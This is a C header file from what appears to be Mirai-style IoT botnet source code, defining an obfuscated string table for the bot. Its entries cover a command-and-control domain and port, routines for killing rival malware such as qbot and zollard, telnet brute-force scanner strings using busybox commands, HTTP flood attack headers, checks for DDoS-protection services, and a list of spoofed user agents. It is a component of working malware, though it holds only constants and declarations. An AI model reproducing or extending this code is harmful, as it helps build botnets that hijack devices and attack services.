#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value 
{
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

/* Generic bot info */
#define TABLE_PROCESS_ARGV              1
#define TABLE_EXEC_SUCCESS              2
#define TABLE_CNC_DOMAIN                3
#define TABLE_CNC_PORT                  4
          
/* Killer data */          
#define TABLE_KILLER_SAFE               5
#define TABLE_KILLER_PROC               6
#define TABLE_KILLER_EXE                7
#define TABLE_KILLER_DELETED            8   /* " (deleted)" */
#define TABLE_KILLER_FD                 9   /* "/fd" */
#define TABLE_KILLER_ANIME              10  /* .anime */
#define TABLE_KILLER_STATUS             11
#define TABLE_MEM_QBOT                  12
#define TABLE_MEM_QBOT2                 13
#define TABLE_MEM_QBOT3                 14
#define TABLE_MEM_UPX                   15
#define TABLE_MEM_ZOLLARD               16
#define TABLE_MEM_REMAITEN              17
          
/* Scanner data */          
#define TABLE_SCAN_CB_DOMAIN            18  /* domain to connect to */
#define TABLE_SCAN_CB_PORT              19  /* Port to connect to */
#define TABLE_SCAN_SHELL                20  /* 'shell' to enable shell access */
#define TABLE_SCAN_ENABLE               21  /* 'enable' to enable shell access */
#define TABLE_SCAN_SYSTEM               22  /* 'system' to enable shell access */
#define TABLE_SCAN_SH                   23  /* 'sh' to enable shell access */
#define TABLE_SCAN_QUERY                24  /* echo hex string to verify login */
#define TABLE_SCAN_RESP                 25  /* utf8 version of query string */
#define TABLE_SCAN_NCORRECT             26  /* 'ncorrect' to fast-check for invalid password */
#define TABLE_SCAN_PS                   27  /* "/bin/busybox ps" */
#define TABLE_SCAN_KILL_9               28  /* "/bin/busybox kill -9 " */
          
/* Attack strings */          
#define TABLE_ATK_VSE                   29  /* TSource Engine Query */
#define TABLE_ATK_RESOLVER              30  /* /etc/resolv.conf */
#define TABLE_ATK_NSERV                 31  /* "nameserver " */

#define TABLE_ATK_KEEP_ALIVE            32  /* "Connection: keep-alive" */
#define TABLE_ATK_ACCEPT                33  // "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" // */
#define TABLE_ATK_ACCEPT_LNG            34  // "Accept-Language: en-US,en;q=0.8"
#define TABLE_ATK_CONTENT_TYPE          35  // "Content-Type: application/x-www-form-urlencoded"
#define TABLE_ATK_SET_COOKIE            36  // "setCookie('"
#define TABLE_ATK_REFRESH_HDR           37  // "refresh:"
#define TABLE_ATK_LOCATION_HDR          38  // "location:"
#define TABLE_ATK_SET_COOKIE_HDR        39  // "set-cookie:"
#define TABLE_ATK_CONTENT_LENGTH_HDR    40  // "content-length:"
#define TABLE_ATK_TRANSFER_ENCODING_HDR 41  // "transfer-encoding:"
#define TABLE_ATK_CHUNKED               42  // "chunked"
#define TABLE_ATK_KEEP_ALIVE_HDR        43  // "keep-alive"
#define TABLE_ATK_CONNECTION_HDR        44  // "connection:"
#define TABLE_ATK_DOSARREST             45  // "server: dosarrest"
#define TABLE_ATK_CLOUDFLARE_NGINX      46  // "server: cloudflare-nginx"

/* User agent strings */
#define TABLE_HTTP_ONE                  47  /* "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" */
#define TABLE_HTTP_TWO                  48  /* "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 OPR/80.0.4170.63" */
#define TABLE_HTTP_THREE                49  /* "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0" */
#define TABLE_HTTP_FOUR                 50  /* "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.62" */
#define TABLE_HTTP_FIVE                 51  /* "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" */
#define TABLE_HTTP_SIX                  52  /* "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" */
#define TABLE_HTTP_SEVEN                53  /* "AppleTV6,2/11.1" */
#define	TABLE_HTTP_EIGHT  	            54	/* "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; da-dk) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5" */
#define	TABLE_HTTP_NINE  	            55	/* "Mozilla/5.0 (Linux; U; Android 4.0.3; de-de; Galaxy S II Build/GRJ22) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30" */
#define	TABLE_HTTP_TEN  	            56	/* "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15" */
#define	TABLE_HTTP_ELEVEN  	            57	/* "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US" */
#define	TABLE_HTTP_TWELVE  	            58	/* "Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)" */
#define	TABLE_HTTP_THIRTEEN  	        59	/* "Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7412.EU" */
#define	TABLE_HTTP_FOURTEEN  	        60	/* "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586" */
#define	TABLE_HTTP_FIFTEEN  	        61	/* "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20" */
#define	TABLE_HTTP_SIXTEEN  	        62	/* "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1" */
#define	TABLE_HTTP_SEVENTEEN  	        63	/* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0" */
#define	TABLE_HTTP_EIGHTEEN  	        64	/* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0" */
#define	TABLE_HTTP_NINETEEN  	        65	/* "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52" */
#define	TABLE_HTTP_TWENTY   	        66	/* "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30" */
#define	TABLE_HTTP_TWENTY_ONE  	        67	/* "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1" */
#define	TABLE_HTTP_TWENTY_TWO  	        68	/* "Python-urllib/2.5" */
#define	TABLE_HTTP_TWENTY_THREE  	    69	/* "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; http://www.google.com/bot.html)" */
#define	TABLE_HTTP_TWENTY_FOUR  	    70	/* "SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)" */
#define	TABLE_HTTP_TWENTY_FIVE  	    71	/* "W3C_Validator/1.305.2.12 libwww-perl/5.64" */
#define	TABLE_HTTP_TWENTY_SIX       	72	/* "W3C_Validator/1.654" */
#define	TABLE_HTTP_TWENTY_SEVEN  	    73	/* "w3m/0.5.1" */
#define	TABLE_HTTP_TWENTY_EIGHT  	    74	/* "WDG_Validator/1.6.2" */
#define	TABLE_HTTP_TWENTY_NINE  	    75	/* "Web Downloader/6.9" */
#define	TABLE_HTTP_THIRTY   	        76	/* "Googlebot/2.1 ( http://www.googlebot.com/bot.html)" */
#define	TABLE_HTTP_THIRTY_ONE  	        77	/* "Googlebot/2.1 (+http://www.google.com/bot.html)" */
#define	TABLE_HTTP_THIRTY_TWO  	        78	/* "iCCrawler (http://www.iccenter.net/bot.htm)" */
#define	TABLE_HTTP_THIRTY_THREE  	    79	/* "iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)" */
#define	TABLE_HTTP_THIRTY_FOUR  	    80	/* "Java/1.4.1_04" */
#define	TABLE_HTTP_THIRTY_FIVE  	    81	/* "Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5" */
#define	TABLE_HTTP_THIRTY_SIX  	        82	/* "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362" */
#define	TABLE_HTTP_THIRTY_SEVEN  	    83	/* "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 OPR/78.0.4093.214" */


#define TABLE_ATK_CONTENT_TYPE_XML         84  // "Content-Type: application/xml"

#define TABLE_MAX_KEYS  85 /* Highest value + 1 */

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
